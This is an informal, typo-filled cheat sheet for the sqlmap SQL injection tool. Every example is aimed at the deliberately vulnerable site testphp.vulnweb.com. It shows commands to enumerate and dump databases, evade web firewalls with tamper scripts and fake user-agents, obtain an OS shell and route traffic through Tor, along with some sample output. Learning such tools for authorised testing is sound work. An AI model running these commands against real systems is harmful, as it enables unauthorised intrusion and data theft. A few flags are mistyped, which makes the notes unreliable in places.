        ___
       __H__
 ___ ___[.]_____ ___ ___  
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   

Install : sudo apt install sqlmap -y 


Features : It have 6 different techineque to test sql-injection
	   If we have vuln database and we got passwd hash it can detect hash
	   It can dumn database of all table


Techniques :

1. Bollean-based blind
2. Error-based
3. Union query-based
4. Stacked queries
5. Time-based Blind
6. Inline Queries

0. Location to save output : /home/$USER/.local/share/sqlmap/output

1. Crawl

depth lvl 1 :  https://www.example/index					 --crawl 1 
depth lvl 2 :  https://www.example/index?=tabs/all				 --crawl 2 
depth lvl 3 :  https://www.example/index?=tabs/all/news				 --crawl 3
depth lvl 4 :  https://www.example/index?=tabs/all/news/latest-news.html	 --crawl 4


example : 
	
#  sqlmap -u http://testphp.vulnweb.com  --crawl 2    [(-u) for url ,crawl level 2]


2. Automate work  

example :

#sqlmap -u http://testphp.vulnweb.com  --crawl 2 --batch   [(--batch)  use all default option do not ask user ]


3. Crawl with Specific technique

example : 

# sqlmap -u http://testphp.vulnweb.com  --crawl 2 --batch --technique="U"    [(--technique="U") It mean use only union based technique]


4. Threads

Threads send many connection at once . Default threads is 1 and maximum is 10.
It help in saving time we can check allmost all pages and web dir of a big website to as fast as possiable

example :

# sqlmap -u http://testphp.vulnweb.com  --crawl 2 --batch --threads 5


5. Risk factor

It is little bit risk bez it can change and even modify database of server

It have levels like :

Risk lvl 1 : use all default payload and it not much riski and it not harm to server 
Risk lvl 2 : It use 1 and try time based sql injection also
Risk lvl 3 : It use both 1,2 and It use all technique and also use mix technique and it is harmfull bez it use all type of commands to inject or if it hit it can modify data
 
 
example :

# sqlmap -u http://testphp.vulnweb.com  --crawl 2 --batch --risk 2

6. Level

GET /home.html HTTP/1.1
Host:developer.mozilla.org
User-Agent:Mozila/5.0(Linux OS X64 /FIREFOX)
Accept:text/html,application/xhtml*xml,application/xml;q=0.9/*;q=0.8
Accept-Lnguage:en-US,en;q=0.5
Cookie:Axcvdvfdsdfgnfhdgfscxvdsfsadcx



Level is like : when we testing on a website, sometime we didn't find any vulnerability 
So Increasing level on 2 it test cookie , On level 3 it can check User-Agent , it finds way to exploit and increase 
default is 1 and highest 5

Using risk and level increase rate of false positive

example :

# sqlmap -u http://testphp.vulnweb.com  --crawl 2 --batch --risk 2 --level 3

7. Verbosity 

0 : Show only python traceback,error and critical message
1 : Show info and waring messages.
2 : Show debug messages.
3 : show pyloads injected.
4 : Show Http requests
5 : Show Http responses headers.
6 : Show http response page content

example :

# sqlmap -u http://testphp.vulnweb.com  --crawl 2 --batch --risk 2 --level 3 -v 6


8. User Enumeration

To find current user : --current-user
To find current Database : --current-db
To identify hostname : --hostname 

example :

# sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --current-user --current-db --hostname  --batch


9. Database info

To get all database info : sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs  [we got dtabse name "acuart" ]

To check how many tables : sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables [(-D) Database name]

we got 8 tables

[INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

To check data of tables : sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products --dump      [(-D) Database name. (-T) Table name (--dump) to get all data]


we got :

Database: acuart
Table: products
[3 entries]
+----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
| id | price | name                                              | rewritename                    | description                                |
+----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
| 1  | 359   | Network Storage D-Link DNS-313 enclosure 1 x SATA | network-attached-storage-dlink | NET STORAGE ENCLOSURE SATA DNS-313 D-LINK  |
| 2  | 10    | Web Camera A4Tech PK-335E                         | web-camera-a4tech              | Web Camera A4Tech PK-335E                  |
| 3  | 812   | Laser Color Printer HP LaserJet M551dn, A4        | color-printer                  | Laser Color Printer HP LaserJet M551dn, A4 |
+----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+


To check which data type is column storing : sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products --column

we got : It storing int values.

Database: acuart
Table: products
[5 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| description | text         |
| name        | text         |
| id          | int unsigned |
| price       | int unsigned |
| rewritename | text         |
+-------------+--------------+


If we got a database and want all data : sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products --dump-all 


9. Save output different directory

--output-dir 

example :

# sqlmap -u http://testphp.vulnweb.com --crawl 3 --output-dir="home/$USER/Desktop/" --batch


10. Add Custom Headers

--headers="User-Agent"

example :

# sqlmap -u http://testphp.vulnweb.com --crawl 3 --headers="Referer:abc.com" -v 4           [(-v 4) to check headers]



11. Use custom user-agent

Help in buypass firewall that block our user-agent 

example : 

# sqlmap -u http://testphp.vulnweb.com --crawl 3 --user-agent="batman_chrome" -v 4 --batch

12. Mobile user-agent

Sqlmap have some default user-agent, It look like the request is comming form mobile, it give choise to select user-agent

example :

# sqlmap -u http://testphp.vulnweb.com --crawl 3 --mobile -v 4

13. Tamper

Bypass firewall that wont allow us to use sql payload , it can manuplate data and try to bypass it 

we can check tamper list

# sqlmap --list-tamper

example : check list and select one like im using bas64

# sqlmap -u http://testphp.vulnweb.com --crawl 3 --tamper=base64encode -v 3 --batch     [(-v 3) to check payload]

14. Check login page for sql injection

First we need inpute class of username, password, login buttom
Second we need to see in which page or directory our login details are going like . /uploads


We can tell sqlmap to attemp sql injection only on login page so we have a tag --form

example : In this case we r redirecting for 

# sqlmap -u http://testphp.vulnweb.com --form


# sqlmap -u http://testphp.vulnweb.com --form 

Send data 

# sqlmap -u http://testphp.vulnweb.com/userinfo.php --data="uname=raj&pass=admin&login=submit" --dbs   [(--dbs) database]


15. Proxy for burp

# sqlmap -u http://testphp.vulnweb.com/ --craql 3 --proxy="127.0.0.1:4444" --batch

16. Some important switch or options

1. Test cookie

example :
# sqlmap -u http://testphp.vulnweb.com/ --cookie "values give"

2. Flush old session

example : remove old session to use new payload again

# sqlmap -u http://testphp.vulnweb.com/ --flush-session

3. Comment

example : give hidden comments

# sqlmap -u http://testphp.vulnweb.com/ --comments

4. Get shell

example : if databse used by root or admin pr vuln

# sqlmap -u http://testphp.vulnweb.com/ --os-shell

5. Get Cmd

example : same as above

#sqlmap -u http://testphp.vulnweb.com/ --os-cmd

6. Random user-agent 
example :Use randomly selected HTTP User-Agent header value

# sqlmap -u http://testphp.vulnweb.com/ --random-agent

7. Tor network


1. example : Use Tor anonymity network

# sqlmap -u http://testphp.vulnweb.com/ --tor

2. example : Check to see if Tor is used properly
# sqlmap -u http://testphp.vulnweb.com/ --check-tor


8.Force database to dump

example :
# sqlmap -u http://testphp.vulnweb.com/ -dbms=DBMS

9. Retrieve everything  

 example :
# sqlmap -u http://testphp.vulnweb.com/

10. Simple wizard interface for beginner users

example : 

# sqlmap --wizard
